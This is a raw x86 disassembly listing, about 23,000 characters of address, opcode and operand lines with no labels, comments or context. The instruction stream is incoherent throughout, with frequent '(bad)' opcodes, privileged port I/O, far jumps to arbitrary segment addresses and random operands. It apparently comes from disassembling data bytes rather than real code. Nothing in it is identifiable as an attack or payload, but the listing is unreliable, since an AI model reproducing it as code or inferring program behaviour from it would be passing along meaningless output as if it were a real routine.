  411d86:	or     dl,BYTE PTR [ebx+0x6f]
  411d89:	ds stos DWORD PTR es:[edi],eax
  411d8b:	push   edx
  411d8c:	sub    DWORD PTR [ecx],ebp
  411d8e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d90:	xchg   DWORD PTR [ebx],ebx
  411d92:	jl     0x411d44
  411d94:	jns    0x411d65
  411d96:	mov    esp,0xb80cb07e
  411d9b:	rol    ecx,1
  411d9d:	call   0x96c:0x473835aa
  411da4:	dec    esp
  411da5:	rdtsc  
  411da7:	mov    ds:0x93615630,al
  411dac:	fld    st(5)
  411dae:	int    0xcd
  411db0:	(bad)  
  411db1:	out    dx,eax
  411db2:	push   eax
  411db3:	mov    eax,ds:0x353dee19
  411db8:	outs   dx,DWORD PTR ds:[esi]
  411db9:	dec    ebx
  411dba:	sbb    edi,ebx
  411dbc:	inc    esp
  411dbd:	data16 icebp 
  411dbf:	cmp    al,0x98
  411dc1:	xor    edi,ecx
  411dc3:	jmp    0x3ae035d5
  411dc8:	jns    0x411dc8
  411dca:	sub    esi,DWORD PTR [ecx+0x22]
  411dcd:	lds    ebx,FWORD PTR [esi+0x5a]
  411dd0:	bound  edi,QWORD PTR ds:0xc30ffb5f
  411dd6:	ret    0xe157
  411dd9:	xchg   edi,eax
  411dda:	leave  
  411ddb:	fs loope 0x411d7a
  411dde:	dec    esi
  411ddf:	and    al,0xe9
  411de1:	fwait
  411de2:	in     eax,dx
  411de3:	inc    ecx
  411de4:	add    al,0x81
  411de6:	pushf  
  411de7:	xor    bh,BYTE PTR [eax-0x49252e26]
  411ded:	inc    ebx
  411dee:	es test al,0xc4
  411df1:	cli    
  411df2:	mov    DWORD PTR [ebx],eax
  411df4:	push   es
  411df5:	xor    al,BYTE PTR [esi+0x6a80d9cc]
  411dfb:	enter  0x2412,0x30
  411dff:	pop    edi
  411e00:	jns    0x411e45
  411e02:	stos   BYTE PTR es:[edi],al
  411e03:	jmp    0x89eb:0x38c90f74
  411e0a:	les    edx,FWORD PTR [edi-0x75]
  411e0d:	or     bl,BYTE PTR [ebx-0x1b1a697f]
  411e13:	ins    DWORD PTR es:[edi],dx
  411e14:	mov    ah,0xbd
  411e16:	loopne 0x411e81
  411e18:	adc    DWORD PTR [esi-0x2a198736],edx
  411e1e:	jl     0x411dcf
  411e20:	ds pop edi
  411e22:	repz aam 0xe8
  411e25:	dec    ebp
  411e26:	or     dh,BYTE PTR ds:0xa11ee173
  411e2c:	xchg   esp,eax
  411e2d:	push   ecx
  411e2e:	dec    ebp
  411e2f:	fstp   DWORD PTR [edi-0x1691612a]
  411e35:	rcr    DWORD PTR [eax],0x79
  411e38:	dec    esp
  411e39:	jnp    0x411e53
  411e3b:	jne    0x411e37
  411e3d:	inc    esi
  411e3e:	fwait
  411e3f:	popf   
  411e40:	adc    eax,0xd28bff08
  411e45:	mov    edx,DWORD PTR es:[esi]
  411e48:	dec    edx
  411e49:	or     DWORD PTR [ebx+0x1c3e3c00],edx
  411e4f:	ret    0x1566
  411e52:	jle    0x411e6a
  411e54:	xchg   edi,eax
  411e55:	sbb    ch,BYTE PTR [edi+edi*8]
  411e58:	sub    al,0xe3
  411e5a:	popf   
  411e5b:	push   ss
  411e5c:	mov    dl,0x4f
  411e5e:	mov    ecx,0x38af7d23
  411e63:	sub    DWORD PTR [esi],eax
  411e65:	sbb    DWORD PTR [edx+0x1dbb527e],ebx
  411e6b:	test   al,0x4b
  411e6d:	mov    dl,BYTE PTR fs:[ebx]
  411e70:	pop    edi
  411e71:	jbe    0x411e89
  411e73:	les    edx,FWORD PTR [eax]
  411e75:	frstor [ebp+0x718c5025]
  411e7b:	push   ds
  411e7c:	in     eax,0x76
  411e7e:	dec    ebp
  411e7f:	jp     0x411e48
  411e81:	sub    edi,DWORD PTR [edx+0x32]
  411e84:	mov    al,0xda
  411e86:	add    DWORD PTR [ebx-0x67],ecx
  411e89:	adc    WORD PTR [eax],di
  411e8c:	ja     0x411e58
  411e8e:	push   ecx
  411e8f:	gs sbb al,0x4b
  411e92:	inc    ebx
  411e93:	dec    edx
  411e94:	mov    edi,0xca00fa5b
  411e99:	or     al,0x88
  411e9b:	call   0x4fd2:0xae378b9c
  411ea2:	dec    eax
  411ea3:	das    
  411ea4:	repz or ch,ah
  411ea7:	mov    dl,dl
  411ea9:	jnp    0x411ec7
  411eab:	and    al,0xc4
  411ead:	enter  0x3f13,0xbe
  411eb1:	jmp    0xe099:0xc2ceab1a
  411eb8:	mov    al,0x1
  411eba:	xchg   DWORD PTR [esi-0x36bf1a28],esp
  411ec0:	aas    
  411ec1:	shl    BYTE PTR [edi],0xb5
  411ec4:	xchg   ebp,eax
  411ec5:	xor    eax,0x767ed83d
  411eca:	call   0x86a7:0xf55da948
  411ed1:	fisub  WORD PTR [ebx+0x36901854]
  411ed7:	push   0xffffff95
  411ed9:	dec    ebx
  411eda:	pop    edx
  411edb:	or     al,0x80
  411edd:	jae    0x411ea1
  411edf:	mov    BYTE PTR [ebp-0x1f],0xef
  411ee3:	adc    bh,BYTE PTR [ebp+0x74]
  411ee6:	sub    dh,bh
  411ee8:	outs   dx,DWORD PTR ds:[esi]
  411ee9:	retf   0xf142
  411eec:	add    al,dh
  411eee:	aas    
  411eef:	dec    esi
  411ef0:	jge    0x411eb1
  411ef2:	lods   al,BYTE PTR ds:[esi]
  411ef3:	adc    al,0x44
  411ef5:	call   0x911:0xe430177f
  411efc:	xor    bl,0x59
  411eff:	cdq    
  411f00:	add    al,0x1a
  411f02:	jmp    0x8110de9
  411f07:	or     eax,0xbac5dcb8
  411f0c:	xor    ch,al
  411f0e:	call   0x4c0ce32
  411f13:	lahf   
  411f14:	sbb    ch,ch
  411f16:	fstp   QWORD PTR ds:0xa7382120
  411f1c:	rcr    DWORD PTR ds:0x7364999a,0x46
  411f23:	add    edx,ecx
  411f25:	mov    esp,0xb4ed5151
  411f2a:	sub    eax,0x87a89e9f
  411f2f:	add    dh,BYTE PTR [esi]
  411f31:	pop    edi
  411f32:	(bad)  
  411f33:	scas   eax,DWORD PTR es:[edi]
  411f34:	je     0x411f68
  411f36:	jns    0x411f87
  411f38:	outs   dx,BYTE PTR ds:[esi]
  411f39:	enter  0xc4d5,0xc1
  411f3d:	sub    DWORD PTR [ebx-0x26],eax
  411f40:	leave  
  411f41:	pop    ss
  411f42:	(bad)  
  411f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f44:	loope  0x411f5d
  411f46:	jge    0x411f9c
  411f48:	pushf  
  411f49:	push   edx
  411f4a:	test   BYTE PTR [ecx+0x60],bl
  411f4d:	ds int 0xe
  411f50:	xchg   dh,bl
  411f52:	adc    DWORD PTR [ecx+ebx*2],esi
  411f55:	jnp    0x411fa7
  411f57:	jecxz  0x411f14
  411f59:	lds    eax,FWORD PTR [esp]
  411f5c:	add    dh,BYTE PTR ds:0xf24afb4c
  411f62:	and    esi,esi
  411f64:	dec    eax
  411f65:	test   DWORD PTR [eax+0x1d],eax
  411f68:	aaa    
  411f69:	out    0xd9,eax
  411f6b:	outs   dx,BYTE PTR ds:[esi]
  411f6c:	es stc 
  411f6e:	retf   
  411f6f:	pop    ebx
  411f70:	das    
  411f71:	pop    edx
  411f72:	mov    ebx,DWORD PTR [eax-0x5f05e149]
  411f78:	data16 sbb al,0xf2
  411f7b:	pop    ds
  411f7c:	lahf   
  411f7d:	add    DWORD PTR [ebp+0x7d],esi
  411f80:	push   esi
  411f81:	jg     0x411f43
  411f83:	ja     0x411f4a
  411f85:	gs dec esi
  411f87:	and    al,0x2a
  411f89:	push   ebx
  411f8a:	dec    ebx
  411f8b:	jb     0x411f63
  411f8d:	sbb    edi,DWORD PTR [esi]
  411f8f:	mov    cl,0x96
  411f91:	sub    ch,bh
  411f93:	jmp    0xe8f8:0x6eaa16e6
  411f9a:	dec    edx
  411f9b:	cmp    dl,dh
  411f9d:	dec    ebx
  411f9e:	cwde   
  411f9f:	dec    esp
  411fa0:	push   0x98f8be63
  411fa5:	imul   esi,DWORD PTR [edx-0xf],0x191eda1b
  411fac:	mov    BYTE PTR [esi+edx*1+0x510ab3f7],cl
  411fb3:	je     0x411ff0
  411fb5:	ins    BYTE PTR es:[edi],dx
  411fb6:	pop    ebp
  411fb7:	in     eax,dx
  411fb8:	push   eax
  411fb9:	xor    BYTE PTR [ecx-0x4896a22a],cl
  411fbf:	int    0xb1
  411fc1:	iret   
  411fc2:	fldl2t 
  411fc4:	mov    ecx,0x34900ec7
  411fc9:	or     al,0xdf
  411fcb:	sub    ah,cl
  411fcd:	xchg   ecx,eax
  411fce:	add    ch,BYTE PTR [eax-0x34]
  411fd1:	popa   
  411fd2:	cmp    edi,DWORD PTR [ebp+esi*4-0x65]
  411fd6:	in     eax,0x99
  411fd8:	mov    bl,0x2d
  411fda:	jbe    0x411f97
  411fdc:	sub    esi,DWORD PTR ds:[ebx+0x6ddb4d41]
  411fe3:	int    0xb7
  411fe5:	and    ch,cl
  411fe7:	sbb    eax,0x371bc3ba
  411fec:	arpl   si,di
  411fee:	retf   0x9b9
  411ff1:	jmp    0x411f96
  411ff3:	iret   
  411ff4:	push   esi
  411ff5:	push   es
  411ff6:	pop    ebx
  411ff7:	sub    edi,ebx
  411ff9:	inc    esi
  411ffa:	rcl    BYTE PTR [ecx+0x2c],0xd0
  411ffe:	pop    esi
  411fff:	mov    esp,0xe033df01
  412004:	stos   DWORD PTR es:[edi],eax
  412005:	jg     0x411fd1
  412007:	ss loopne 0x41201a
  41200a:	loop   0x412060
  41200c:	in     al,0xd7
  41200e:	xchg   ebp,eax
  41200f:	clc    
  412010:	ja     0x411fcb
  412012:	scas   al,BYTE PTR es:[edi]
  412013:	(bad)  
  412014:	and    al,0x3a
  412016:	cmp    dl,BYTE PTR [ebp+ebx*4-0x6b]
  41201a:	bound  eax,QWORD PTR [edx+0x1f]
  41201d:	jle    0x41201d
  41201f:	lods   eax,DWORD PTR ss:[esi]
  412021:	dec    edi
  412022:	and    eax,0xbba587a
  412027:	rcl    DWORD PTR [ebp-0x18],0x17
  41202b:	sub    edi,DWORD PTR [ecx+0x74280e16]
  412031:	xchg   esp,eax
  412032:	sub    ecx,DWORD PTR [esi+0x623aef71]
  412038:	pop    es
  412039:	sbb    ah,ch
  41203b:	inc    esp
  41203c:	and    BYTE PTR [ebx-0x807495c],ah
  412042:	int3   
  412043:	imul   esi,DWORD PTR [edx+ecx*8],0x16ee85d0
  41204a:	push   ss
  41204b:	cmp    edi,0x4a89e726
  412051:	xchg   esi,eax
  412052:	stos   BYTE PTR es:[edi],al
  412053:	push   eax
  412054:	jp     0x412099
  412056:	cli    
  412057:	shl    DWORD PTR cs:[edi-0x6c95a171],0xf8
  41205f:	adc    bh,BYTE PTR [edi-0x4d]
  412062:	out    dx,eax
  412063:	cmc    
  412064:	lods   eax,DWORD PTR ds:[esi]
  412065:	or     ebx,ebx
  412067:	(bad)  
  412069:	push   esi
  41206a:	sub    al,0x50
  41206c:	lock (bad) 
  41206f:	out    0x24,eax
  412071:	sub    cl,0x8d
  412074:	xor    al,BYTE PTR [esi+edi*2+0x53]
  412078:	xchg   ebp,eax
  412079:	jne    0x41207f
  41207b:	cmp    ecx,DWORD PTR [eax+edi*1+0x2]
  41207f:	adc    cl,cl
  412081:	push   edx
  412082:	test   al,0xd1
  412084:	outs   dx,DWORD PTR ds:[esi]
  412085:	mov    ebx,0xfe5251c
  41208a:	inc    esi
  41208b:	shr    esi,1
  41208d:	sub    al,0xf
  41208f:	xor    al,0x4d
  412091:	push   ds
  412092:	sub    BYTE PTR [ecx+0x5cff454c],ah
  412098:	sub    DWORD PTR [eax+0x3111b303],ebx
  41209e:	std    
  41209f:	pop    ss
  4120a0:	shr    eax,1
  4120a2:	stc    
  4120a3:	bound  edi,QWORD PTR [edx+eax*1-0x2d]
  4120a7:	mov    edi,0x8446eea7
  4120ac:	xor    eax,0x98e8c6a2
  4120b1:	mov    ah,0x4b
  4120b3:	rcl    BYTE PTR [ecx+ecx*1],cl
  4120b6:	in     eax,dx
  4120b7:	cmc    
  4120b8:	add    esp,DWORD PTR [ebx+0x51]
  4120bb:	pop    ds
  4120bc:	add    DWORD PTR ds:0xfe094936,esp
  4120c2:	(bad)  
  4120c3:	stc    
  4120c4:	scas   al,BYTE PTR es:[edi]
  4120c5:	mul    esp
  4120c7:	(bad)  
  4120c8:	xor    DWORD PTR [ecx-0x573626ac],esp
  4120ce:	push   cs
  4120cf:	xor    eax,0x1e664f08
  4120d4:	pusha  
  4120d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120d6:	sub    al,BYTE PTR [esi+0x2893122b]
  4120dc:	inc    esi
  4120dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120de:	mov    gs,WORD PTR [ebp+0x46]
  4120e1:	dec    esp
  4120e2:	xchg   ebp,eax
  4120e3:	enter  0x5840,0x3
  4120e7:	push   0x862690b2
  4120ec:	dec    edi
  4120ed:	dec    ecx
  4120ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ef:	xchg   ecx,eax
  4120f0:	cld    
  4120f1:	xor    DWORD PTR [esi-0x29],edi
  4120f4:	je     0x41210d
  4120f6:	dec    ebx
  4120f7:	and    ebp,DWORD PTR [esi]
  4120f9:	sbb    eax,0x85a5a712
  4120fe:	mov    al,0x2f
  412100:	jns    0x4120e0
  412102:	cmp    eax,edi
  412104:	sub    al,0xd8
  412106:	ds jne 0x4120a7
  412109:	inc    edi
  41210a:	call   FWORD PTR [edx+0x46]
  41210d:	sbb    edx,ebx
  41210f:	mov    ebx,0x646efc5f
  412114:	iret   
  412115:	cmp    BYTE PTR [esi],dl
  412117:	and    eax,0xa2b37ac6
  41211c:	ds inc esp
  41211e:	add    dh,BYTE PTR [eax]
  412120:	inc    ecx
  412121:	in     al,dx
  412122:	rol    BYTE PTR [ebx+ebp*8-0x55c9173a],0x24
  41212a:	(bad)  
  41212b:	pop    ds
  41212c:	pop    ss
  41212d:	popf   
  41212e:	jg     0x4121a0
  412130:	shr    DWORD PTR [edx-0x3c0a20d6],cl
  412136:	inc    ebp
  412137:	jp     0x41214b
  412139:	test   BYTE PTR [eax],bh
  41213b:	push   ecx
  41213c:	pmuludq mm6,QWORD PTR [ecx+0x26]
  412140:	mov    ch,0x5e
  412142:	xor    al,0xc1
  412144:	cmp    DWORD PTR [ebp-0x19],edi
  412147:	and    bh,BYTE PTR [edi+0x0]
  41214a:	add    eax,0xb94bd93c
  41214f:	sub    eax,0x9bcc8261
  412154:	imul   ecx,DWORD PTR [edx],0xeb5e930
  41215a:	pop    ss
  41215b:	pop    ds
  41215c:	xchg   esi,eax
  41215d:	push   cs
  41215e:	dec    DWORD PTR [edx+edx*2+0x52e7c150]
  412165:	lods   eax,DWORD PTR ds:[esi]
  412166:	fisub  DWORD PTR [ecx+ecx*2+0x60]
  41216a:	into   
  41216b:	in     eax,0xe2
  41216d:	push   ss
  41216e:	push   ebp
  41216f:	aam    0xd2
  412171:	inc    DWORD PTR [edx+ebp*8+0x4a5a1986]
  412178:	sti    
  412179:	pop    ebx
  41217a:	xor    ah,ah
  41217c:	les    esp,FWORD PTR [ecx+0x198973d1]
  412182:	addr16 call 0xd0acec0a
  412188:	add    ebp,ecx
  41218a:	ins    DWORD PTR es:[edi],dx
  41218b:	adc    ecx,edi
  41218d:	ss int 0x5d
  412190:	rol    DWORD PTR [esi+eax*8+0x45],1
  412194:	sbb    esi,DWORD PTR [ebp+0x37]
  412197:	lods   al,BYTE PTR ds:[esi]
  412198:	mov    dl,0x90
  41219a:	lock std 
  41219c:	or     eax,0xceec2c5e
  4121a1:	mov    ds:0x5353ba05,al
  4121a6:	add    DWORD PTR [ebp-0x61fc2d3d],0xffffffdb
  4121ad:	push   cs
  4121ae:	rcl    DWORD PTR [ecx+0x73d3e528],cl
  4121b4:	or     ch,cl
  4121b6:	mov    ch,0x20
  4121b8:	sar    BYTE PTR [eax+eiz*2],1
  4121bb:	stos   DWORD PTR es:[edi],eax
  4121bc:	daa    
  4121bd:	jmp    0x4121d0
  4121bf:	out    0x84,eax
  4121c1:	sub    bl,BYTE PTR [ecx+0x1af4463c]
  4121c7:	push   eax
  4121c8:	xchg   ebp,eax
  4121c9:	add    eax,0x5be1775d
  4121ce:	and    al,0x19
  4121d0:	or     al,BYTE PTR [ebx]
  4121d2:	and    cl,BYTE PTR ds:0x3caaf5b7
  4121d8:	repz sar BYTE PTR [edi],cl
  4121db:	fiadd  WORD PTR [edx]
  4121dd:	mov    edi,0x35f3fcb2
  4121e2:	test   BYTE PTR [edx-0x43],0x52
  4121e6:	mov    eax,ds:0x91b87bfa
  4121eb:	out    dx,al
  4121ec:	xor    bh,al
  4121ee:	jae    0x412220
  4121f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f1:	xchg   ebp,eax
  4121f2:	pop    eax
  4121f3:	movhlps xmm3,xmm2
  4121f6:	mov    cl,0x33
  4121f8:	rcr    DWORD PTR [edx-0xf],cl
  4121fb:	scas   al,BYTE PTR es:[edi]
  4121fc:	in     al,0x16
  4121fe:	out    dx,al
  4121ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412200:	je     0x412203
  412202:	aam    0xc8
  412204:	mov    bh,0xb6
  412206:	in     eax,0x25
  412208:	in     eax,dx
  412209:	push   edx
  41220a:	pusha  
  41220b:	dec    ebp
  41220c:	(bad)  
  41220d:	cmp    DWORD PTR [ebx+0x14],esi
  412210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412211:	fldenv [ecx]
  412213:	(bad)  
  412214:	jns    0x41220c
  412216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412217:	and    eax,0x4f8eaef4
  41221c:	inc    edi
  41221d:	(bad)  
  41221e:	shl    edi,cl
  412220:	popf   
  412221:	or     al,0xb1
  412223:	mov    ds:0x4bf01500,eax
  412228:	lods   al,BYTE PTR ds:[esi]
  412229:	adc    al,0xf0
  41222b:	cmp    edx,esi
  41222d:	add    al,0xb0
  41222f:	imul   edx,DWORD PTR [ebp-0x8d2d030],0x5a
  412236:	pop    ecx
  412237:	jecxz  0x41229f
  412239:	ins    DWORD PTR es:[edi],dx
  41223a:	mov    esi,0xe3241ef0
  41223f:	(bad)  
  412240:	mov    edi,0x5d7e9a0f
  412245:	xor    al,0x33
  412247:	dec    ebx
  412248:	lds    eax,FWORD PTR [ebx]
  41224a:	push   es
  41224b:	jo     0x4121e9
  41224d:	loop   0x41222c
  41224f:	out    0x4a,al
  412251:	aaa    
  412252:	inc    edi
  412253:	out    0xd6,eax
  412255:	mov    ch,0x60
  412257:	xor    al,0x3b
  412259:	dec    esi
  41225a:	mov    ebp,0x7182738e
  41225f:	enter  0xdb50,0x4c
  412263:	aas    
  412264:	inc    edx
  412265:	mov    esi,0x34497517
  41226a:	jnp    0x41226a
  41226c:	sbb    al,0xf
  41226e:	or     BYTE PTR [esi],dh
  412270:	jb     0x41226d
  412272:	push   cs
  412273:	gs scas al,BYTE PTR es:[edi]
  412275:	push   esp
  412276:	test   DWORD PTR [ebx+0x34],eax
  412279:	enter  0xe4b1,0xbf
  41227d:	test   al,0xe6
  41227f:	add    eax,0xdaa8b060
  412284:	je     0x41229d
  412286:	jo     0x412225
  412288:	(bad)  
  412289:	mov    ah,0x3e
  41228b:	pop    edx
  41228c:	not    DWORD PTR gs:[edx+0x43e0e77c]
  412293:	xchg   esp,eax
  412294:	add    eax,ebx
  412296:	xor    eax,0xd3e1aafd
  41229b:	pop    ecx
  41229c:	mov    bh,0xb8
  41229e:	shl    BYTE PTR [edi+0xd03cc7a],0xa0
  4122a5:	popa   
  4122a6:	fcom   DWORD PTR [ebx+0x3e13dcb1]
  4122ac:	inc    ebp
  4122ad:	xor    eax,0xa8430eb7
  4122b2:	cwde   
  4122b3:	shr    BYTE PTR [ecx-0x4b1ce86d],cl
  4122b9:	aam    0x52
  4122bb:	push   cs
  4122bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122bd:	mov    ds:0xf3625d87,al
  4122c2:	fcomi  st,st(6)
  4122c4:	jno    0x412296
  4122c6:	loopne 0x41224f
  4122c8:	leave  
  4122c9:	jno    0x41227a
  4122cb:	xchg   ebp,eax
  4122cc:	arpl   cx,si
  4122ce:	out    dx,eax
  4122cf:	syscall 
  4122d1:	dec    ebp
  4122d2:	mov    bl,0xe6
  4122d4:	shl    DWORD PTR [esi+0x72],cl
  4122d7:	adc    BYTE PTR [edi],dh
  4122d9:	sbb    eax,0x2eaaa782
  4122de:	out    0xea,eax
  4122e0:	retf   
  4122e1:	mov    al,ds:0x11b518c6
  4122e6:	in     al,dx
  4122e7:	sar    BYTE PTR [edx-0x35],1
  4122ea:	dec    esp
  4122eb:	add    DWORD PTR [edx],eax
  4122ed:	ins    DWORD PTR es:[edi],dx
  4122ee:	push   ds
  4122ef:	in     eax,0x67
  4122f1:	add    eax,0xe75cce45
  4122f6:	(bad)  
  4122f7:	cli    
  4122f8:	nop
  4122f9:	(bad)  
  4122fa:	jmp    0x1ae9:0xa0dd56d
  412301:	or     al,0xa4
  412303:	bound  eax,QWORD PTR [esi+0x78dc23ef]
  412309:	pop    ebp
  41230a:	add    dh,bl
  41230c:	inc    ebp
  41230d:	jo     0x412372
  41230f:	mov    eax,0x35e170c7
  412314:	stos   BYTE PTR es:[edi],al
  412315:	jl     0x4122aa
  412317:	add    DWORD PTR [edx+eax*2-0x692422b9],0xffffff89
  41231f:	xchg   ebx,eax
  412320:	sub    al,0xf6
  412322:	mov    dl,0x84
  412324:	pop    ebx
  412325:	gs push cs
  412327:	mov    ch,0xb8
  412329:	sub    ch,BYTE PTR [esp+eax*2]
  41232c:	mov    esp,0x41cb5134
  412331:	or     BYTE PTR [edi+ebx*4],bl
  412334:	jno    0x412398
  412336:	push   esi
  412337:	xchg   edx,eax
  412338:	test   al,0x8e
  41233a:	push   ecx
  41233b:	mov    eax,ds:0x3c9805a6
  412340:	test   DWORD PTR [ebp+ebp*2-0x591a105c],esp
  412347:	sub    al,0xf7
  412349:	mov    esp,0x3664b6ab
  41234e:	(bad)  
  41234f:	jnp    0x412346
  412351:	and    BYTE PTR [ebx+0x26],dh
  412354:	aam    0x1b
  412356:	sbb    DWORD PTR [ebx],edx
  412358:	push   ecx
  412359:	ins    BYTE PTR es:[edi],dx
  41235a:	(bad)  
  41235b:	and    ebp,esi
  41235d:	inc    ecx
  41235e:	mov    cl,0xd
  412360:	add    eax,edi
  412362:	or     eax,0x64c5855e
  412367:	in     eax,dx
  412368:	jmp    0x4123c5
  41236a:	pop    esi
  41236b:	lds    edx,FWORD PTR [ebp+edi*2+0x3a40eeb0]
  412372:	dec    ecx
  412373:	add    esi,eax
  412375:	push   ebx
  412376:	ds pop edi
  412378:	add    edi,DWORD PTR [eax-0x4412d980]
  41237e:	mov    edi,0x59a96ec9
  412383:	ror    edi,cl
  412385:	cmp    BYTE PTR [edx],0xb0
  412388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412389:	dec    esi
  41238a:	idiv   BYTE PTR [edi-0x5e]
  41238d:	cmp    eax,edx
  41238f:	or     ecx,DWORD PTR [edx+0x1f]
  412392:	dec    ebp
  412393:	inc    edi
  412394:	lock pop ecx
  412396:	ja     0x4123e4
  412398:	cwde   
  412399:	outs   dx,BYTE PTR ds:[esi]
  41239a:	mov    al,0xaa
  41239c:	and    cl,BYTE PTR [eax+0x72]
  41239f:	mov    edx,0xb78ad4a4
  4123a4:	or     eax,0x20495e48
  4123a9:	dec    ebp
  4123aa:	pop    edi
  4123ab:	ins    BYTE PTR es:[edi],dx
  4123ac:	adc    al,0x3c
  4123ae:	js     0x41242b
  4123b0:	fadd   st,st(3)
  4123b2:	in     eax,dx
  4123b3:	dec    edx
  4123b4:	and    DWORD PTR [ecx+0x56],edi
  4123b7:	repz repz cwde 
  4123ba:	sbb    BYTE PTR [edx+0x63],ah
  4123bd:	xor    ebp,DWORD PTR [ebx]
  4123bf:	mov    bh,0x55
  4123c1:	(bad)  
  4123c2:	add    edx,DWORD PTR [ebx+ebp*2-0x4b]
  4123c6:	aas    
  4123c7:	mov    ah,0xe9
  4123c9:	jae    0x412406
  4123cb:	xlat   BYTE PTR ds:[ebx]
  4123cc:	in     al,0x5a
  4123ce:	arpl   WORD PTR [ebx],bp
  4123d0:	icebp  
  4123d1:	xchg   esp,eax
  4123d2:	jge    0x412390
  4123d4:	push   cs
  4123d5:	stc    
  4123d6:	ss xchg ebp,eax
  4123d8:	dec    esp
  4123d9:	dec    edi
  4123da:	add    BYTE PTR [di],bh
  4123dd:	scas   eax,DWORD PTR es:[edi]
  4123de:	inc    ecx
  4123df:	lahf   
  4123e0:	add    BYTE PTR [edi-0x24],dh
  4123e3:	test   cl,al
  4123e5:	push   0xd9d59ade
  4123ea:	push   eax
  4123eb:	mov    ds:0xcc2521f8,al
  4123f0:	jle    0x41238d
  4123f2:	dec    esp
  4123f3:	inc    esp
  4123f4:	jmp    0x4123e5
  4123f6:	or     eax,DWORD PTR [edx+ecx*4+0x434d0956]
  4123fd:	inc    ecx
  4123fe:	in     eax,dx
  4123ff:	dec    esi
  412400:	pop    edi
  412401:	jl     0x412389
  412403:	scas   eax,DWORD PTR es:[edi]
  412404:	cs ja  0x4123e2
  412407:	je     0x4123d0
  412409:	pop    ss
  41240a:	sub    eax,0xe00d3f30
  41240f:	outs   dx,DWORD PTR ds:[esi]
  412410:	cmp    eax,0xfda33407
  412415:	into   
  412416:	jp     0x41244e
  412418:	inc    edi
  412419:	sbb    eax,0x79b5c0ef
  41241e:	cmc    
  41241f:	mov    ah,al
  412421:	pop    esi
  412422:	adc    al,0xe0
  412424:	mov    dl,0x61
  412426:	cmp    DWORD PTR [edi+ecx*2],0x126a8bfe
  41242d:	(bad)  
  41242e:	adc    eax,0x5147f466
  412433:	imul   esi,DWORD PTR [eax+0x624cd215],0x57
  41243a:	cdq    
  41243b:	ret    0x89a7
  41243e:	push   0x7f
  412440:	lods   al,BYTE PTR ds:[esi]
  412441:	call   0x78bf8e89
  412446:	dec    ecx
  412447:	test   DWORD PTR [ecx],0x32f92e3a
  41244d:	pop    edi
  41244e:	mov    ebx,0x782e14d1
  412453:	mov    esi,0x56dd2dfe
  412458:	inc    ebx
  412459:	(bad)  
  41245b:	cmp    DWORD PTR [edi-0x5d3fa958],edx
  412461:	and    dh,BYTE PTR [ebx+0x40b50ba8]
  412467:	mov    bh,0xe6
  412469:	(bad)  
  41246a:	in     eax,0x84
  41246c:	call   0xd02262d1
  412471:	push   es
  412472:	imul   ecx,edx,0x3a
  412475:	lds    ebp,FWORD PTR [edx]
  412477:	(bad)  
  412478:	in     eax,0x87
  41247a:	shl    DWORD PTR [edx],cl
  41247c:	mov    al,ds:0x31aab37b
  412481:	or     BYTE PTR [edi+0x45],dh
  412484:	jne    0x4124b0
  412486:	mov    ecx,0xf5aa7b7
  41248b:	fwait
  41248c:	pop    ebx
  41248d:	arpl   WORD PTR [esi],bx
  41248f:	add    DWORD PTR [edi],edx
  412491:	(bad)  
  412492:	rcr    DWORD PTR ds:0x7e0b2514,1
  412498:	xchg   ecx,eax
  412499:	cdq    
  41249a:	mov    eax,0x2dc2a1ac
  41249f:	jmp    0x41249f
  4124a1:	inc    ebx
  4124a2:	and    BYTE PTR [edi+0x3aeac97f],dh
  4124a8:	jne    0x41249e
  4124aa:	stos   BYTE PTR es:[edi],al
  4124ab:	mov    ds:0x7d57263c,al
  4124b0:	dec    edi
  4124b1:	pop    edx
  4124b2:	(bad)  
  4124b3:	arpl   bp,bp
  4124b5:	(bad)  
  4124b6:	sub    edx,ebp
  4124b8:	neg    ecx
  4124ba:	and    al,0x1
  4124bc:	repnz cld 
  4124be:	adc    BYTE PTR [edx],0xba
  4124c1:	icebp  
  4124c2:	fst    st(3)
  4124c4:	push   eax
  4124c5:	dec    ebp
  4124c6:	sub    BYTE PTR [eax],0xea
  4124c9:	mov    al,0x63
  4124cb:	mov    edx,0x60b9d043
  4124d0:	icebp  
  4124d1:	xchg   ebp,eax
  4124d2:	or     bh,al
  4124d4:	fadd   DWORD PTR [eax]
  4124d6:	ret    
  4124d7:	mov    ebx,ecx
  4124d9:	or     eax,0xa7e06eb
  4124de:	dec    esp
  4124df:	enter  0x5c14,0x57
  4124e3:	imul   ebp,DWORD PTR [edi],0x60
  4124e6:	inc    edi
  4124e7:	neg    BYTE PTR [edx+0x9]
  4124ea:	push   ebx
  4124eb:	cli    
  4124ec:	mov    BYTE PTR [edx+0x65],ch
  4124ef:	int3   
  4124f0:	retf   
  4124f1:	adc    al,0x2d
  4124f3:	outs   dx,DWORD PTR ds:[esi]
  4124f4:	enter  0x897d,0x42
  4124f8:	scas   al,BYTE PTR es:[di]
  4124fa:	lea    ebx,[ecx+0x2e]
  4124fd:	sahf   
  4124fe:	pop    ecx
  4124ff:	outs   dx,DWORD PTR ds:[esi]
  412500:	mov    dl,0x56
  412502:	mov    BYTE PTR [edx+0x17],bl
  412505:	sbb    dh,bh
  412507:	mov    al,0x9b
  412509:	js     0x4124c7
  41250b:	add    esi,ebp
  41250d:	fwait
  41250e:	or     BYTE PTR [edi-0x6e39e8d7],al
  412514:	lods   al,BYTE PTR ss:[esi]
  412516:	cs inc eax
  412518:	or     al,0x7c
  41251a:	dec    edi
  41251b:	pop    eax
  41251c:	sub    ch,0x39
  41251f:	sbb    esp,DWORD PTR [esi]
  412521:	mov    WORD PTR [ecx-0x7d],cs
  412524:	mov    ecx,fs
  412526:	lock jne 0x4124f1
  412529:	xor    al,0x90
  41252b:	cs dec edx
  41252d:	xchg   edx,eax
